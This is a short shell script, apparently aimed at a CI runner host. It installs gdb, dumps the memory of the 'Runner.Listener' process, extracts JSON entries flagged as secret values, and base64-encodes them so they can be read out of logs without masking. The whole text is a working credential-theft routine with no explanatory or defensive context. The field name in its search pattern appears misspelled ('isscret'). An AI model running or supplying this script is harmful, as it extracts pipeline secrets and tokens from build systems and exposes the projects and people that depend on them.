
sudo apt update
sudo apt install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
grep -Eao '"[^"]+":\{"value":"[^"]*","isscret":"true"\}' k.dump* | base64
